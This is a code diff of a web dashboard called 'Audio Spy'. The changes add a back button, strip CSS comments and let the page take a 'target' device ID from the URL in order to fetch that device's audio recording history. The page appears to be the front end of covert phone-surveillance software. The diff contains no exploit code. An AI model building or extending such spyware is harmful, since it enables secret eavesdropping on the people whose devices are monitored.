@@ -17,7 +17,7 @@
             --border: rgba(255, 255, 255, 0.1);
             --accent-red: #ff3b30;
             --accent-blue: #0a84ff;
-            --accent-green: #30d158; /* Pure Green */
+            --accent-green: #30d158;
             --text-main: #ffffff;
             --text-muted: #8b949e;
             --glass: blur(12px);
@@ -41,13 +41,17 @@
 
         .top-bar { display: flex; justify-content: space-between; align-items: center; }
 
-        .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
+        /* Back Button Added */
+        .back-btn {
+            color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px;
+        }
 
-        /* --- Green Live Badge --- */
+        .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; }
+
         .live-badge {
             font-size: 0.7rem; 
-            background: rgba(48, 209, 88, 0.15); /* Green BG */
-            color: var(--accent-green);           /* Green Text */
+            background: rgba(48, 209, 88, 0.15);
+            color: var(--accent-green);           
             padding: 4px 10px; border-radius: 20px; 
             border: 1px solid rgba(48, 209, 88, 0.3);
             display: flex; align-items: center; gap: 6px;
@@ -55,7 +59,7 @@
 
         .dot {
             width: 6px; height: 6px; 
-            background: var(--accent-green); /* Green Dot */
+            background: var(--accent-green);
             border-radius: 50%;
             animation: pulse 1.5s infinite;
         }
@@ -123,13 +127,14 @@
     <div id="accessDenied">
         <h2 style="color: var(--accent-red);">ACCESS DENIED</h2>
         <p style="color: var(--text-muted);">No Target ID Found.</p>
-        <button onclick="window.location.href='index.html'" style="padding: 10px 20px; background: var(--text-main); border: none; border-radius: 5px; cursor: pointer;">Go to Login</button>
+        <button onclick="window.history.back()" style="padding: 10px 20px; background: var(--text-main); border: none; border-radius: 5px; cursor: pointer;">Go Back</button>
     </div>
 
     <div class="header">
         <div class="top-bar">
             <div class="title">
-                <i class="fa-solid fa-user-secret"></i> Audio Spy
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+                <span><i class="fa-solid fa-user-secret"></i> Audio Spy</span>
             </div>
             <div class="live-badge">
                 <div class="dot"></div> ONLINE
@@ -156,15 +161,26 @@
         let currentDeviceId = '';
         let localContacts = []; 
 
+        // --- NEW ID CHECKING SYSTEM (Like Contacts Page) ---
         window.onload = () => {
-            const savedID = localStorage.getItem('spy_device_id');
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlID = urlParams.get('id'); // URL se ID uthao
 
-            if (!savedID) {
+            // Agar URL me ID hai, to use karo, warna localStorage check karo
+            if (urlID) {
+                currentDeviceId = urlID;
+                localStorage.setItem('spy_device_id', urlID); // Save for later
+            } else {
+                currentDeviceId = localStorage.getItem('spy_device_id');
+            }
+
+            // Agar dono jagah ID nahi mili, to Access Denied
+            if (!currentDeviceId) {
                 document.getElementById('accessDenied').style.display = 'flex';
                 return;
             }
 
-            currentDeviceId = savedID;
+            console.log("✅ Loaded Audio Spy for ID:", currentDeviceId);
 
             // 1. Contacts Load
             loadLocalContacts();
@@ -247,6 +263,7 @@
             document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Syncing Audio Data...</div>`;
 
             try {
+                // Fetch using currentDeviceId
                 const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                 const data = await res.json();
 
